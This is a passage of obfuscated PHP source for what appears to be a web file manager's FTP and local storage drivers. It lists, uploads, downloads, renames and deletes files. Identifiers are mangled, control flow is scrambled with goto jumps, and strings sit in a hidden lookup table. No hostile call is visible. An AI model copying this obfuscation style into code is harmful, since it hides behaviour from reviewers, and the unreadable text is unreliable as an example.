($e¬¿…Æ¹¹ã as $aŒ¾£áĞöÙ => $c›†Ÿ‚†) { if (isset($this->{$aŒ¾£áĞöÙ})) { $this->{$aŒ¾£áĞöÙ} = $c›†Ÿ‚†; } } static $c¹Â¹²˜£ = array(); $e¹½·õòŞ = md5(json_encode($e¬¿…Æ¹¹ã)); goto bÙ«¯ºÁ·; bÑØïôÌ–¿: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $DÊÖá­–é = @ftp_login($this->connect, $this->username, $this->userpass); goto EòÚÇ; bÙ«¯ºÁ·: if (isset($c¹Â¹²˜£[$e¹½·õòŞ])) { foreach ($c¹Â¹²˜£[$e¹½·õòŞ] as $aŒ¾£áĞöÙ => $c›†Ÿ‚†) { $this->{$aŒ¾£áĞöÙ} = $c›†Ÿ‚†; } return !0; } $A¿ÉÅ¡ÀÊŠ = parse_url(trim($this->server, $d°­ç˜ŠÚª[8])); $this->host = $A¿ÉÅ¡ÀÊŠ[$d°­ç˜ŠÚª[166]]; goto BåğæÃĞõâ; BåğæÃĞõâ: $EŞµŒŞ—İ = isset($A¿ÉÅ¡ÀÊŠ[$d°­ç˜ŠÚª[165]]) && $A¿ÉÅ¡ÀÊŠ[$d°­ç˜ŠÚª[165]] == $d°­ç˜ŠÚª[1122] ? !0 : !1; $this->scheme = $EŞµŒŞ—İ ? $d°­ç˜ŠÚª[1123] : $d°­ç˜ŠÚª[1124]; $this->port = isset($A¿ÉÅ¡ÀÊŠ[$d°­ç˜ŠÚª[167]]) ? $A¿ÉÅ¡ÀÊŠ[$d°­ç˜ŠÚª[167]] : 21; goto bÑØïôÌ–¿; a„¼ÙĞ„‹Ô: } private function _isconn() { return is_resource($this->connect); } public function mkfile($fİ”Ğ„îÒ , $E·–“÷Àªç = '', $dĞà†ÌËÉ = REPEAT_RENAME) { if ($this->setContent($fİ”Ğ„îÒ , $E·–“÷Àªç)) { return $this->getPathOuter($fİ”Ğ„îÒ ); } return !1; } public function mkdir($DóŞ¨±ãËÚ, $bè„®­¶µ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $DóŞ¨±ãËÚ = $this->iconvSystem($DóŞ¨±ãËÚ); if ($this->isFolder($DóŞ¨±ãËÚ) || @ftp_mkdir($this->connect, $DóŞ¨±ãËÚ)) { return $this->getPathOuter($DóŞ¨±ãËÚ); } if (!$this->mkdir($this->pathFather($DóŞ¨±ãËÚ))) { return !1; } if ($DóŞ¨±ãËÚ = @ftp_mkdir($this->connect, $DóŞ¨±ãËÚ)) { return $this->getPathOuter($DóŞ¨±ãËÚ); } return !1; } public function copyFile($bÇÖÄËóÜâ, $dò…²ÀŠŠ˜) { goto AÛÈ¯°Œ º; AÛÈ¯°Œ º: if (!$this->_isconn()) { return !1; } $a©Ãâ©Â‡ = $this->pathThis($this->iconvSystem($bÇÖÄËóÜâ)); $cˆ¯òß£» = $this->tempFile($a©Ãâ©Â‡); goto AëªÅøÕ§Ñ; AëªÅøÕ§Ñ: $dğô……ÂŞŠ = $this->iconvApp($cˆ¯òß£»); $this->download($bÇÖÄËóÜâ, $dğô……ÂŞŠ); $F½ ¿µí’‚ = $this->upload($dò…²ÀŠŠ˜, $dğô……ÂŞŠ); goto D×ëÔ„·À’; D×ëÔ„·À’: $this->tempFileRemve($cˆ¯òß£»); return $F½ ¿µí’‚; goto AƒíƒöÏô; AƒíƒöÏô: } public function moveFile($FÅ½¾½„ÛŸ, $AğÊê›Ô‡­) { if (!$this->_isconn()) { return !1; } $FÅ½¾½„ÛŸ = $this->iconvSystem($FÅ½¾½„ÛŸ); $AğÊê›Ô‡­ = $this->iconvSystem($AğÊê›Ô‡­); $dÊÍ¸‚ù† = @ftp_rename($this->connect, $FÅ½¾½„ÛŸ, $AğÊê›Ô‡­); return $dÊÍ¸‚ù† ? $this->getPathOuter($AğÊê›Ô‡­) : !1; } public function delFile($eìÔ¯šÙªğ) { if (!$this->_isconn()) { return !1; } $eìÔ¯šÙªğ = $this->iconvSystem($eìÔ¯šÙªğ); return @ftp_delete($this->connect, $eìÔ¯šÙªğ); } public function delFolder($EÁµÓÇÄÖ) { if (!$this->_isconn()) { return !1; } $EÁµÓÇÄÖ = $this->iconvSystem($EÁµÓÇÄÖ); $eÀµ’Ñ§ö¶ = $this->ftpList($EÁµÓÇÄÖ); if (!$eÀµ’Ñ§ö¶) { return @ftp_rmdir($this->connect, $EÁµÓÇÄÖ); } foreach ($eÀµ’Ñ§ö¶ as $fáÛ½¡æ) { if ($this->isFolder($fáÛ½¡æ)) { $fáÛ½¡æ = $this->iconvApp($fáÛ½¡æ); $this->delFolder($fáÛ½¡æ); } else { @ftp_delete($this->connect, $fáÛ½¡æ); } } return @ftp_rmdir($this->connect, $EÁµÓÇÄÖ); } public function rename($d®äß«ğ, $dØˆØ™…•ˆ) { goto e•ÏœØ‘ƒ; Fˆ†öç…áÙ: return $C‘­ğ†…‘ì ? $this->getPathOuter($däÇ´•–µ¼) : !1; goto f“è—„ÔŒç; e•ÏœØ‘ƒ: $eÉí“…ËĞè =& $_SERVER[ì‹É]; if (!$this->_isconn()) { return !1; } $c‰•õâ§Ğé = $this->fileNameAuto($this->pathFather($d®äß«ğ), $dØˆØ™…•ˆ); goto fËÕô‚»ŸÃ; c·ÕéøÕ¦í: $däÇ´•–µ¼ = rtrim($C”ù¿ëÃÄ, $eÉí“…ËĞè[8]) . $eÉí“…ËĞè[8] . $c‰•õâ§Ğé; $C‘­ğ†…‘ì = @ftp_rename($this->connect, $d®äß«ğ, $däÇ´•–µ¼); $däÇ´•–µ¼ = $this->iconvApp($däÇ´•–µ¼); goto Fˆ†öç…áÙ; fËÕô‚»ŸÃ: $c‰•õâ§Ğé = $this->iconvSystem($c‰•õâ§Ğé); $d®äß«ğ = $this->iconvSystem($d®äß«ğ); $C”ù¿ëÃÄ = $this->pathFather($d®äß«ğ); goto c·ÕéøÕ¦í; f“è—„ÔŒç: } private function folderInfo($dİÄ¢ƒ¹¼Î, $CªÁÔ×Ö† = false) { goto EÕÒ…‘„šá; EÕÒ…‘„šá: $fŞ‘¬÷µÈ =& $_SERVER[ì‹É]; $B¸ÆÛ”¿ã = $this->getPathOuter(rtrim($dİÄ¢ƒ¹¼Î, $fŞ‘¬÷µÈ[8])); $A¦êç‰ƒ–È = $this->pathThis($B¸ÆÛ”¿ã); goto cÍµãÃ©ğ¯; cÍµãÃ©ğ¯: $D„êöÀâ…” = $this->iconvSystem($dİÄ¢ƒ¹¼Î); if ($CªÁÔ×Ö†) { return array($fŞ‘¬÷µÈ[28] => $A¦êç‰ƒ–È, $fŞ‘¬÷µÈ[76] => $B¸ÆÛ”¿ã, $fŞ‘¬÷µÈ[29] => $fŞ‘¬÷µÈ[77]); } $C¬ˆö–Ã½‹ = array($fŞ‘¬÷µÈ[28] => $A¦êç‰ƒ–È, $fŞ‘¬÷µÈ[76] => $B¸ÆÛ”¿ã, $fŞ‘¬÷µÈ[29] => $fŞ‘¬÷µÈ[77], $fŞ‘¬÷µÈ[184] => $fŞ‘¬÷µÈ[50], $fŞ‘¬÷µÈ[108] => $fŞ‘¬÷µÈ[50], $fŞ‘¬÷µÈ[1126] => !0, $fŞ‘¬÷µÈ[1127] => !0); goto FëÕ£ëóìö; FëÕ£ëóìö: return $C¬ˆö–Ã½‹; goto E™Ë†Ö¥³³; E™Ë†Ö¥³³: } private function fileInfo($DÄ‰ÒË‰, $d„ŒÂÕÌ±Œ = false) { goto e–ŠŒºœ˜â; D—™–öß¬¢: $E”«²õ¬™[$d ñöõ»ÎÉ[108]] = $E”«²õ¬™[$d ñöõ»ÎÉ[108]] > 0 ? $E”«²õ¬™[$d ñöõ»ÎÉ[108]] : $d ñöõ»ÎÉ[50]; return $E”«²õ¬™; goto AŠ¨ÚòÖ†’; e–ŠŒºœ˜â: $d ñöõ»ÎÉ =& $_SERVER[ì‹É]; $A²Â´Ñö = $this->getPathOuter(rtrim($DÄ‰ÒË‰, $d ñöõ»ÎÉ[8])); $d™”ÅºÎ® = $this->pathThis($A²Â´Ñö); goto dÎšç˜•‡Õ; dÎšç˜•‡Õ: $AÎ¸º´âïÈ = $this->iconvSystem($DÄ‰ÒË‰); if ($d„ŒÂÕÌ±Œ) { return array($d ñöõ»ÎÉ[28] => $d™”ÅºÎ®, $d ñöõ»ÎÉ[76] => $A²Â´Ñö, $d ñöõ»ÎÉ[29] => $d ñöõ»ÎÉ[164], $d ñöõ»ÎÉ[157] => $this->ext($DÄ‰ÒË‰), $d ñöõ»ÎÉ[78] => $this->size($DÄ‰ÒË‰)); } $E”«²õ¬™ = array($d ñöõ»ÎÉ[28] => $d™”ÅºÎ®, $d ñöõ»ÎÉ[76] => $A²Â´Ñö, $d ñöõ»ÎÉ[29] => $d ñöõ»ÎÉ[164], $d ñöõ»ÎÉ[184] => $d ñöõ»ÎÉ[50], $d ñöõ»ÎÉ[108] => @ftp_mdtm($this->connect, $AÎ¸º´âïÈ), $d ñöõ»ÎÉ[157] => $this->ext($DÄ‰ÒË‰), $d ñöõ»ÎÉ[78] => $this->size($DÄ‰ÒË‰), $d ñöõ»ÎÉ[1126] => !0, $d ñöõ»ÎÉ[1127] => !0); goto D—™–öß¬¢; AŠ¨ÚòÖ†’: } public function size($b‰åÕâŸËà) { $cç­„ÔÌÒÑ = $this->objectMeta($b‰åÕâŸËà); return $cç­„ÔÌÒÑ ? $cç­„ÔÌÒÑ[$_SERVER[ì‹É][78]] : 0; } public function info($cÜæ˜šéÔ«) { if ($this->isFile($cÜæ˜šéÔ«)) { return $this->fileInfo($cÜæ˜šéÔ«, 0); } else { if ($this->isFolder($cÜæ˜šéÔ«)) { return $this->folderInfo($cÜæ˜šéÔ«); } } return !1; } public function exist($cô©©Š±) { return $this->objectMeta($cô©©Š±) ? !0 : !1; } public function isFile($bã¡—ã³¼—) { $côËé‚Ñ—Ê =& $_SERVER[ì‹É]; $D‰ì†¤¢×Ë = $this->objectMeta($bã¡—ã³¼—); return $D‰ì†¤¢×Ë ? $D‰ì†¤¢×Ë[$côËé‚Ñ—Ê[29]] == $côËé‚Ñ—Ê[164] : !1; } public function isFolder($F¾ Ğ¯¯ë³) { $f§¹ÊŞ¥ =& $_SERVER[ì‹É]; $A±ÌçÅ¸… = $this->objectMeta($F¾ Ğ¯¯ë³); return $A±ÌçÅ¸… ? $A±ÌçÅ¸…[$f§¹ÊŞ¥[29]] == $f§¹ÊŞ¥[77] : !1; } public function listPath($bªÀÅ„Á‰, $F±òÅæ„¸· = false) { goto FµºÛ¼±Ê°; FµºÛ¼±Ê°: $aáÇÂè²á´ =& $_SERVER[ì‹É]; if (!$this->_isconn()) { return !1; } $bªÀÅ„Á‰ = $this->iconvSystem($bªÀÅ„Á‰); goto DˆØ¨‰éŸ§; DˆØ¨‰éŸ§: $dÎ“¶ï´ã = $this->ftpList($bªÀÅ„Á‰); $b—Ãö¹¤ò¤ = array($aáÇÂè²á´[75] => array(), $aáÇÂè²á´[74] => array()); if (!$dÎ“¶ï´ã) { return $b—Ãö¹¤ò¤; } goto Dˆ—çšİ·; Dˆ—çšİ·: foreach ($dÎ“¶ï´ã as $bªÀÅ„Á‰) { if ($this->isFolder($bªÀÅ„Á‰)) { $b—Ãö¹¤ò¤[$aáÇÂè²á´[75]][] = $this->folderInfo($bªÀÅ„Á‰, $F±òÅæ„¸·); } else { $b—Ãö¹¤ò¤[$aáÇÂè²á´[74]][] = $this->fileInfo($bªÀÅ„Á‰, $F±òÅæ„¸·); } } return $b—Ãö¹¤ò¤; goto C®İÖ¯ìáá; C®İÖ¯ìáá: } public function has($d±Ÿ½»‡á“, $aÎ‰ôĞØ… = false, $eÏÆëÙ­ÇÎ = true) { goto dœªÌï°®; DÖíÓ‘¡‰â: foreach ($CßÖ÷ˆ» as $d±Ÿ½»‡á“) { if ($eÏÆëÙ­ÇÎ) { if (!$this->isFolder($d±Ÿ½»‡á“)) { return !0; } } else { if ($this->isFolder($d±Ÿ½»‡á“)) { return !0; } } } return !1; goto f™¤®•ÓùÙ; eÑ¨´¿£î: $CßÖ÷ˆ» = $this->ftpList($d±Ÿ½»‡á“); if (!$CßÖ÷ˆ») { return !1; } if ($aÎ‰ôĞØ…) { return array($fÊ¸‚×¾¤£[188] => 0, $fÊ¸‚×¾¤£[189] => count($CßÖ÷ˆ»)); } goto DÖíÓ‘¡‰â; dœªÌï°®: $fÊ¸‚×¾¤£ =& $_SERVER[ì‹É]; if (!$this->_isconn()) { return !1; } $d±Ÿ½»‡á“ = $this->iconvSystem($d±Ÿ½»‡á“); goto eÑ¨´¿£î; f™¤®•ÓùÙ: } public function listAll($FŸ¹„œòĞ) { goto f°×îÎŠ»‰; bëô—ë³÷ù: foreach ($cÆÄ²²á[$D± ”¨¨†‚[75]] as $cñÖõë¯¶Œ) { $e˜Îê³¯ø[] = array($D± ”¨¨†‚[76] => $D± ”¨¨†‚[8] . trim(str_replace($FŸ¹„œòĞ, $D± ”¨¨†‚[33], $cñÖõë¯¶Œ), $D± ”¨¨†‚[8]) . $D± ”¨¨†‚[8], $D± ”¨¨†‚[77] => 1, $D± ”¨¨†‚[78] => 0); } foreach ($cÆÄ²²á[$D± ”¨¨†‚[74]] as $B„ïªàÄ‰Ï) { $e˜Îê³¯ø[] = array($D± ”¨¨†‚[76] => $D± ”¨¨†‚[8] . trim(str_replace($FŸ¹„œòĞ, $D± ”¨¨†‚[33], $B„ïªàÄ‰Ï), $D± ”¨¨†‚[8]), $D± ”¨¨†‚[77] => 0, $D± ”¨¨†‚[78] => $this->size($B„ïªàÄ‰Ï)); } return $e˜Îê³¯ø; goto cŠˆÁ™‡Ú; f°×îÎŠ»‰: $D± ”¨¨†‚ =& $_SERVER[ì‹É]; if (!$this->_isconn()) { return !1; } $FŸ¹„œòĞ = $this->iconvSystem($FŸ¹„œòĞ); goto AŒ¦¾µ—ì; AŒ¦¾µ—ì: $cÆÄ²²á = array($D± ”¨¨†‚[74] => array(), $D± ”¨¨†‚[75] => array()); $this->recursionFtpFiles($FŸ¹„œòĞ, $cÆÄ²²á); $e˜Îê³¯ø = array(); goto bëô—ë³÷ù; cŠˆÁ™‡Ú: } public function getContent($e˜ë˜™Ùä¡) { if (!$this->_isconn()) { return !1; } $e˜ë˜™Ùä¡ = $this->iconvSystem($e˜ë˜™Ùä¡); return $this->fileSubstr($e˜ë˜™Ùä¡); } public function setContent($BøÊ¾šğ¶Ì, $b‚ÁÒÇŠ×„ = '') { goto D“‹¼ƒ¡® ; E¥”Ÿà Ö…: file_put_contents($D¬«„±ÛÎ‚, $b‚ÁÒÇŠ×„); $Fòñô©¥ç = $this->upload($BøÊ¾šğ¶Ì, $this->iconvApp($D¬«„±ÛÎ‚)); $this->tempFileRemve($D¬«„±ÛÎ‚); goto c®—¼æÊ˜‘; c®—¼æÊ˜‘: return $Fòñô©¥ç; goto F¬©¬îùÃë; D“‹¼ƒ¡® : if (!$this->_isconn()) { return !1; } $Cºè…§çø = $this->pathThis($this->iconvSystem($BøÊ¾šğ¶Ì)); $D¬«„±ÛÎ‚ = $this->tempFile($Cºè…§çø); goto E¥”Ÿà Ö…; F¬©¬îùÃë: } public function fileSubstr($A„ Æ¶ë·î, $A¥ÔĞ§‡ = 0, $D•«‰©Ã¡â = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($A„ Æ¶ë·î, $A¥ÔĞ§‡, $D•«‰©Ã¡â); } private function ftpRequest($B¤Ş‡Ç¿ë, $dºƒù›¯ÒÆ = 0, $AÉèÕîæ«ï = false) { goto F‹Øğ¶¼©; DÖÒãƒÂÁ: curl_setopt($DÖ‰ŠÆ£, CURLOPT_RETURNTRANSFER, 1); $FÅá·ŒÉ°Œ = curl_exec($DÖ‰ŠÆ£); curl_close($DÖ‰ŠÆ£); goto eªè™¥ñ”ç; F‹Øğ¶¼©: $B¤Ş‡Ç¿ë = $this->iconvSystem($B¤Ş‡Ç¿ë); $CØ…“ñ¦Š² = $this->scheme . $this->host . $_SERVER[ì‹É][4] . $this->port; $DÖ‰ŠÆ£ = curl_init(); goto eàö¯­£›; eªè™¥ñ”ç: return $FÅá·ŒÉ°Œ; goto F¼Ö’ô‘Ö; eàö¯­£›: curl_setopt($DÖ‰ŠÆ£, CURLOPT_URL, $CØ…“ñ¦Š² . $this->pathEncode($B¤Ş‡Ç¿ë)); curl_setopt($DÖ‰ŠÆ£, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($AÉèÕîæ«ï) { $B·ÊçÇ¥‘À = $dºƒù›¯ÒÆ + $AÉèÕîæ«ï - 1; curl_setopt($DÖ‰ŠÆ£, CURLOPT_RANGE, "{$dºƒù›¯ÒÆ}\55{$B·ÊçÇ¥‘À}"); } goto DÖÒãƒÂÁ; F¼Ö’ô‘Ö: } public function upload($a‰ÅÛ¬õœ¡, $b¤ÖäÄÔèÎ, $DØ»îÖàÜª = false, $E˜š»¢ïÓŠ = REPEAT_REPLACE) { goto Fñ œ›Åªå; DÛšÓ¸º‰¯: $b¤ÖäÄÔèÎ = $this->iconvSystem($b¤ÖäÄÔèÎ); $EˆìõÙ…†ì = ftp_nb_put($this->connect, $a‰ÅÛ¬õœ¡, $b¤ÖäÄÔèÎ, FTP_BINARY); while ($EˆìõÙ…†ì == FTP_MOREDATA) { $EˆìõÙ…†ì = ftp_nb_continue($this->connect); } goto d‡ª­«¥òå; Fñ œ›Åªå: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($a‰ÅÛ¬õœ¡))) { return !1; } $a‰ÅÛ¬õœ¡ = $this->iconvSystem($a‰ÅÛ¬õœ¡); goto DÛšÓ¸º‰¯; d‡ª­«¥òå: if ($EˆìõÙ…†ì != FTP_FINISHED) { return !1; } return $this->getPathOuter($a‰ÅÛ¬õœ¡); goto DÎ‚à¨åÊ; DÎ‚à¨åÊ: } public function download($c¿ˆÁ‰‘Êƒ, $fÂ×Š­­ = '') { goto DáñËÎ½Û; DáñËÎ½Û: if (!$this->_isconn()) { return !1; } $A…¶×«ÇÇ = $this->pathFather($fÂ×Š­­); if (!IO::mkdir($A…¶×«ÇÇ)) { return !1; } goto aˆØ‘ÂÂõ­; f”ç‡Ö™’Ä: while ($EÕÉ†Àê¾µ == FTP_MOREDATA) { $EÕÉ†Àê¾µ = ftp_nb_continue($this->connect); } if ($EÕÉ†Àê¾µ != FTP_FINISHED) { return !1; } return $this->iconvApp($fÂ×Š­­); goto cêÀİµ¿™ğ; aˆØ‘ÂÂõ­: $c¿ˆÁ‰‘Êƒ = $this->iconvSystem($c¿ˆÁ‰‘Êƒ); $fÂ×Š­­ = $this->iconvSystem($fÂ×Š­­); $EÕÉ†Àê¾µ = ftp_nb_get($this->connect, $fÂ×Š­­, $c¿ˆÁ‰‘Êƒ, FTP_BINARY); goto f”ç‡Ö™’Ä; cêÀİµ¿™ğ: } private function ftpList($fõãÁ¹Ö¾) { goto eÈ”õœ‹‡; aÔº©ëã”·: $aˆ°²ßœ»Ê = array(); foreach ($c¸¬Œ”–Ê as $EÉ¸¶®Ş“›) { if ($EÉ¸¶®Ş“› == $e·†‘¯ĞÕÛ[94] || $EÉ¸¶®Ş“› == $e·†‘¯ĞÕÛ[1129]) { continue; } if (!strstr($EÉ¸¶®Ş“›, $e·†‘¯ĞÕÛ[8])) { $EÉ¸¶®Ş“› = $fõãÁ¹Ö¾ . ltrim($EÉ¸¶®Ş“›, $e·†‘¯ĞÕÛ[8]); } $aˆ°²ßœ»Ê[] = $this->iconvApp($EÉ¸¶®Ş“›); } return $aˆ°²ßœ»Ê; goto B¸ÛéËÚïŒ; f¯£°Šš®ô: $fõãÁ¹Ö¾ = rtrim($fõãÁ¹Ö¾, $e·†‘¯ĞÕÛ[8]) . $e·†‘¯ĞÕÛ[8]; $c¸¬Œ”–Ê = @ftp_nlist($this->connect, $fõãÁ¹Ö¾); if ($c¸¬Œ”–Ê === !1) { $c¸¬Œ”–Ê = @ftp_rawlist($this->connect, $fõãÁ¹Ö¾); foreach ($c¸¬Œ”–Ê as $D…õÖÆÕëÒ => $b‡¯ƒ…Ñö¿) { $c¸¬Œ”–Ê[$D…õÖÆÕëÒ] = end(explode($e·†‘¯ĞÕÛ[1128], $b‡¯ƒ…Ñö¿)); } } goto aÔº©ëã”·; eÈ”õœ‹‡: $e·†‘¯ĞÕÛ =& $_SERVER[ì‹É]; if (!$this->isFolder($fõãÁ¹Ö¾)) { return !1; } @ftp_chdir($this->connect, $e·†‘¯ĞÕÛ[8]); goto f¯£°Šš®ô; B¸ÛéËÚïŒ: } private function recursionFtpFiles($AÜ÷ÊËõ², &$f–Ğ‘÷˜®º) { $Aï¤ñ³õ«Ø =& $_SERVER[ì‹É]; if (!$this->_isconn()) { return !1; } if (!($dè‡¥Å×† = $this->ftpList($AÜ÷ÊËõ²))) { return !1; } foreach ($dè‡¥Å×† as $AÜ÷ÊËõ²) { if ($this->isFolder($AÜ÷ÊËõ²)) { $this->recursionFtpFiles($AÜ÷ÊËõ², $f–Ğ‘÷˜®º); $f–Ğ‘÷˜®º[$Aï¤ñ³õ«Ø[75]][] = $AÜ÷ÊËõ²; } else { $f–Ğ‘÷˜®º[$Aï¤ñ³õ«Ø[74]][] = $AÜ÷ÊËõ²; } } } private function objectMeta($A””À‰ÙÌ) { goto d¢®äö–ç»; f«è…Šó”×: $F÷‚šŸŠğ = @ftp_size($this->connect, $this->iconvSystem($A””À‰ÙÌ)); if ($F÷‚šŸŠğ != -1) { $cšî—èâ—Ò = array($DíŸ‘’äÅò[78] => $F÷‚šŸŠğ, $DíŸ‘’äÅò[29] => $DíŸ‘’äÅò[164]); } else { $d¸Ò²ƒ™Ô‰ = @ftp_chdir($this->connect, $this->iconvSystem($A””À‰ÙÌ)); $cšî—èâ—Ò = $d¸Ò²ƒ™Ô‰ ? array($DíŸ‘’äÅò[78] => 0, $DíŸ‘’äÅò[29] => $DíŸ‘’äÅò[77]) : !1; } Cache::set($Bµò˜Ä½æ, $cšî—èâ—Ò, 0); goto dƒ±¡ÃÏ…ô; bßÏŒ¨³”˜: if ($cšî—èâ—Ò !== null && $cšî—èâ—Ò !== !1) { return $cšî—èâ—Ò; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $DíŸ‘’äÅò[8]); goto f«è…Šó”×; dƒ±¡ÃÏ…ô: return $cšî—èâ—Ò; goto d±÷æ¼ÕŸ; d¢®äö–ç»: $DíŸ‘’äÅò =& $_SERVER[ì‹É]; $Bµò˜Ä½æ = $DíŸ‘’äÅò[1130] . md5($A””À‰ÙÌ); $cšî—èâ—Ò = Cache::get($Bµò˜Ä½æ); goto bßÏŒ¨³”˜; d±÷æ¼ÕŸ: } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($f”ï„ÇÂ·ƒ) { if (substr($f”ï„ÇÂ·ƒ, 0, 2) == $_SERVER[ì‹É][1119]) { $f”ï„ÇÂ·ƒ = BASIC_PATH . substr($f”ï„ÇÂ·ƒ, 2); } return $f”ï„ÇÂ·ƒ; } public function iconvApp($A„‰Ş¡Œ‚¿) { $AŒ°øœ’ó‚ =& $_SERVER[ì‹É]; global $config; return $this->iconvTo($A„‰Ş¡Œ‚¿, $config[$AŒ°øœ’ó‚[1117]], $config[$AŒ°øœ’ó‚[1116]]); } public function iconvSystem($e›‚ˆ½³àå) { $fÈ’çŒµ¾† =& $_SERVER[ì‹É]; global $config; return $this->iconvTo($e›‚ˆ½³àå, $config[$fÈ’çŒµ¾†[1116]], $config[$fÈ’çŒµ¾†[1117]]); } public function getPathOuter($EÃÎÁ”™…‰) { goto C‹ñœã«½; d…¿¤—‹Ñ‰: return $this->pathDriver . $D…³‹Ø‡À·[8] . ltrim($EÃÎÁ”™…‰, $D…³‹Ø‡À·[8]); goto EˆÏÅÖÎ„Ê; C‹ñœã«½: $D…³‹Ø‡À· =& $_SERVER[ì‹É]; $BÕÈëÙì©Ã = $this->iconvApp($this->pathBase); $EÃÎÁ”™…‰ = $this->iconvApp($EÃÎÁ”™…‰); goto cëíÄÓ…øß; D’éãŞ¸ÌÔ: $EÃÎÁ”™…‰ = KodIO::clear($EÃÎÁ”™…‰); $EÃÎÁ”™…‰ = substr($EÃÎÁ”™…‰, strlen($BÕÈëÙì©Ã)); if (empty($this->pathDriver)) { return $EÃÎÁ”™…‰; } goto d…¿¤—‹Ñ‰; cëíÄÓ…øß: if (substr($BÕÈëÙì©Ã, 0, 2) == $D…³‹Ø‡À·[1119]) { $BÕÈëÙì©Ã = BASIC_PATH . substr($BÕÈëÙì©Ã, 2); } if (substr($EÃÎÁ”™…‰, 0, 2) == $D…³‹Ø‡À·[1119]) { $EÃÎÁ”™…‰ = BASIC_PATH . substr($EÃÎÁ”™…‰, 2); } $BÕÈëÙì©Ã = KodIO::clear($BÕÈëÙì©Ã); goto D’éãŞ¸ÌÔ; EˆÏÅÖÎ„Ê: } public function mkfile($bÜÖ¤¦š®î, $B‘—ˆ‘¯·ù = '', $fÏ‚ŒÈÜµŒ = REPEAT_RENAME) { $bÜÖ¤¦š®î = $this->iconvSystem($bÜÖ¤¦š®î); @touch($bÜÖ¤¦š®î); if ($B‘—ˆ‘¯·ù) { file_put_contents($bÜÖ¤¦š®î, $B‘—ˆ‘¯·ù); } return is_file($bÜÖ¤¦š®î) ? $this->getPathOuter($bÜÖ¤¦š®î) : !1; } public function mkdir($c†İ‚óİ÷®, $D¢±Ö‡ñ = REPEAT_SKIP) { $c†İ‚óİ÷® = $this->iconvSystem($c†İ‚óİ÷®); if (is_dir($c†İ‚óİ÷®)) { return $this->getPathOuter($c†İ‚óİ÷®); } @mkdir($c†İ‚óİ÷®, 511, !0); return is_dir($c†İ‚óİ÷®) ? $this->getPathOuter($c†İ‚óİ÷®) : !1; } public function copyFile($DÂÍß¦…ÑŒ, $AÈ“íÎÅêÇ) { $this->mkdir($this->pathFather($AÈ“íÎÅêÇ)); $DÂÍß¦…ÑŒ = $this->iconvSystem($DÂÍß¦…ÑŒ); $AÈ“íÎÅêÇ = $this->iconvSystem($AÈ“íÎÅêÇ); $C¤ñáÙæË = @copy($DÂÍß¦…ÑŒ, $AÈ“íÎÅêÇ); return $C¤ñáÙæË ? $this->getPathOuter($AÈ“íÎÅêÇ) : !1; } public function moveFile($DË—ù‹‘™Æ, $BŠÕÉ´È‹Œ) { $this->mkdir($this->pathFather($BŠÕÉ´È‹Œ)); $DË—ù‹‘™Æ = $this->iconvSystem($DË—ù‹‘™Æ); $BŠÕÉ´È‹Œ = $this->iconvSystem($BŠÕÉ´È‹Œ); $aÃ”È¬”Šò = intval(@rename($DË—ù‹‘™Æ, $BŠÕÉ´È‹Œ)); if (!$aÃ”È¬”Šò) { if ($aÃ”È¬”Šò = intval(@copy($DË—ù‹‘™Æ, $BŠÕÉ´È‹Œ))) { @unlink($DË—ù‹‘™Æ); } } return $aÃ”È¬”Šò ? $this->getPathOuter($BŠÕÉ´È‹Œ) : !1; } public function delFile($a­¶›ŸÚ¥) { $a­¶›ŸÚ¥ = $this->iconvSystem($a­¶›ŸÚ¥); if (!@unlink($a­¶›ŸÚ¥)) { @chmod($a­¶›ŸÚ¥, 511); if (!@unlink($a­¶›ŸÚ¥)) { return !1; } } else { return !0; } } public function delFolder($B°íæ“Ø½µ) { goto C¯‘Ü‰ÌÔ¬; b©Í˜‹Âè†: return rmdir($B°íæ“Ø½µ); goto eŠ«‚Ï¸¦ ; bº–«àÅøÒ: if (!($cŒÀ¸±««Ö = opendir($B°íæ“Ø½µ))) { return !1; } while (($Fô¢À¤Öøˆ = readdir($cŒÀ¸±««Ö)) !== !1) { if ($Fô¢À¤Öøˆ == $A´•‘“¾ô[94] || $Fô¢À¤Öøˆ == $A´•‘“¾ô[1129]) { continue; } $FøÁ›ÇŒ = $B°íæ“Ø½µ . $A´•‘“¾ô[8] . $Fô¢À¤Öøˆ; if (!is_dir($FøÁ›ÇŒ)) { if (!unlink($FøÁ›ÇŒ)) { chmod($FøÁ›ÇŒ, 511); if (!unlink($FøÁ›ÇŒ)) { return !1; } } } else { chmod($FøÁ›ÇŒ, 511); $FøÁ›ÇŒ = $this->iconvApp($FøÁ›ÇŒ); if (!$this->delFolder($FøÁ›ÇŒ)) { return !1; } } } closedir($cŒÀ¸±««Ö); goto b©Í˜‹Âè†; C¯‘Ü‰ÌÔ¬: $A´•‘“¾ô =& $_SERVER[ì‹É]; $B°íæ“Ø½µ = $this->iconvSystem($B°íæ“Ø½µ); if (!is_dir($B°íæ“Ø½µ)) { return !0; } goto bº–«àÅøÒ; eŠ«‚Ï¸¦ : } public function rename($bÜ¿œŠÇ, $fÑâ„Ô²†) { goto béñ¬‡Á¾Æ; a§ù”’×ªí: $bÜ¿œŠÇ = $this->iconvSystem($bÜ¿œŠÇ); $eÑ¿ÂÛ¨î = $this->pathFather($bÜ¿œŠÇ); $EˆŠ†ƒÇÖë = rtrim($eÑ¿ÂÛ¨î, $FË”™­Æ—[8]) . $FË”™­Æ—[8] . $FÄÜóª›Ù; goto eåÆŸæ™Åè; eåÆŸæ™Åè: $díœ°¨”‰ = @rename($bÜ¿œŠÇ, $EˆŠ†ƒÇÖë); $EˆŠ†ƒÇÖë = $this->iconvApp($EˆŠ†ƒÇÖë); return $díœ°¨”‰ ? $this->getPathOuter($EˆŠ†ƒÇÖë) : !1; goto E¾³Ğœ­ª; béñ¬‡Á¾Æ: $FË”™­Æ— =& $_SERVER[ì‹É]; $FÄÜóª›Ù = $this->fileNameAuto($this->pathFather($bÜ¿œŠÇ), $fÑâ„Ô²†); $FÄÜóª›Ù = $this->iconvSystem($FÄÜóª›Ù); goto a§ù”’×ªí; E¾³Ğœ­ª: } public function size($CØ¹Æ‘É…) { 